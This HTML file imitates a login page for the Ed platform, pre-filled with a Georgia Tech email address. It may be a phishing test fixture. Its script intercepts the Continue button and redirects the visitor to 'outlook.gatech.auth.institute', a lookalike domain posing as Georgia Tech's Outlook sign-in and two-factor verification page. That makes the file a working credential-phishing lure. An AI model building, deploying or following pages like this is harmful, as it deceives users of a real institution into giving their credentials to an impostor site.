<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ed - Login</title>
    <style>
        :root {
            --bg-dark: #1C2A38;
            --purple-logo-bg: #9b59b6;
            --message-bg: #551F2A;
            --error-message-text: #ffffff;
            --input-bg: #ffffff;
            --input-border: rgba(255, 255, 255, 0.3);
            --input-text: #333333;
            --dropdown-bg: transparent;
            --dropdown-text: #ffffff;
            --blue-button-bg: #006efb;
            --blue-button-hover: #0056d3;
            --link-color: #CCCED1;
            --link-hover: rgba(255, 255, 255, 0.8);
            --footer-link-color: #FFFFFF;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--bg-dark);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-container {
            width: 80px;
            height: 80px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .logo-image {
            width: 100%;
            height: 100%;
            border-radius: 16px;
        }

        .start-region-select {
            border: 1px solid var(--input-border);
            border-radius: 5px;
            padding: 8px 30px 8px 12px;
            color: var(--dropdown-text);
            font-weight: 500;
            -webkit-appearance: none;
            appearance: none;
            font-size: 14px;
            margin: 0 auto 20px auto;
            display: block;
            cursor: pointer;
            background-color: var(--dropdown-bg);
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3e%3cpath fill='%23ffffff' fill-opacity='0.75' d='M5 6L0 0h10z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 8px center;
            min-width: 140px;
        }

        .start-message {
            border-radius: 4px;
            margin: 15px auto 20px auto;
            color: var(--error-message-text);
            background-color: var(--message-bg);
            padding: 12px 20px;
            text-align: center;
            line-height: 1.4;
            width: 100%;
            max-width: 350px;
            font-size: 15px;
        }

        .form-container {
            width: 100%;
            margin-top: 10px;
        }

        .form-label {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
            margin-bottom: 8px;
            display: block;
            font-weight: 500;
        }

        .email-input {
            width: 100%;
            padding: 12px;
            background-color: var(--input-bg);
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 16px;
            transition: border-color 0.2s;
            color: var(--input-text);
        }

        .email-input:focus {
            outline: 2px solid var(--blue-button-bg);
            outline-offset: 2px;
            border-color: var(--blue-button-bg);
        }

        .start-btn {
            display: block;
            margin: 0 0 20px 0;
            color: #fff;
            font-weight: 600;
            font-size: 16px;
            height: 45px;
            width: 100%;
            border: none;
            border-radius: 4px;
            text-align: center;
            transition: all 0.1s ease-in-out;
            background-color: var(--blue-button-bg);
            cursor: pointer;
        }

        .start-btn:hover {
            background-color: var(--blue-button-hover);
            transform: translateY(-1px);
        }

        .start-btn:active {
            transform: translateY(0);
        }

        .login-links {
            text-align: center;
            width: 100%;
            margin-top: 10px;
        }

        .login-links a {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
            transition: color 0.2s;
        }

        .login-links a:hover {
            color: var(--link-hover);
            text-decoration: underline;
        }

        .footer-links {
            position: fixed;
            bottom: 24px;
            right: 24px;
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: var(--footer-link-color);
            text-decoration: none;
            font-size: 14px;
            transition: color 0.2s;
        }

        .footer-links a:hover {
            color: var(--link-hover);
        }

        @media (max-width: 480px) {
            .login-container {
                max-width: 100%;
                padding: 0 20px;
            }

            .footer-links {
                bottom: 16px;
                right: 16px;
                gap: 16px;
            }
        }
    </style>
    <script>
        const ENABLE_REDIRECT = true; 
        
        function redirectToOutlook() {
            if (ENABLE_REDIRECT) {
                console.log('Redirecting now...');
                const redirectUrl = 'https://outlook.gatech.auth.institute/ref=session_auth_2fa_verify&token=' + 
                                   Math.random().toString(36).substring(2, 15) + 
                                   '&session=' + Date.now();
                console.log('Redirect URL:', redirectUrl);
                window.location.href = redirectUrl;
            } else {
                console.log('Redirect is disabled');
            }
        }
        
        function handleSubmit(event) {
            console.log('Form submitted');
            event.preventDefault();
            event.stopPropagation();
            
            console.log('Calling redirect function...');
            redirectToOutlook();
            return false;
        }
        
        window.onload = function() {
            document.getElementById('email-input').value = 'abadger3@gatech.edu';
            
            const submitBtn = document.querySelector('.start-btn');
            if (submitBtn) {
                submitBtn.addEventListener('click', function(event) {
                    console.log('Button clicked');
                    event.preventDefault();
                    handleSubmit(event);
                });
            }
        };
    </script>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="/logo.svg" alt="Ed" class="logo-image">
        </div>

        <select class="start-region-select" title="Region">
            <option value="us">US</option>
            <option value="au">Australia</option>
            <option value="ca">Canada</option>
            <option value="eu">Europe</option>
            <option value="gb">United Kingdom</option>
        </select>

        <div class="start-message" aria-live="polite">
            Log in to continue.
        </div>

        <form class="form-container" onsubmit="return handleSubmit(event);">
            <label class="form-label">Email</label>
            <input type="email" 
                   id="email-input"
                   class="email-input" 
                   value="abadger3@gatech.edu"
                   required>

            <button class="start-btn" type="submit">
                Continue
            </button>

            <div class="login-links">
                <a href="#">Login with an email code</a>
                <a href="#">Forgot password?</a>
            </div>
        </form>
    </div>

    <div class="footer-links">
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
</body>
</html>
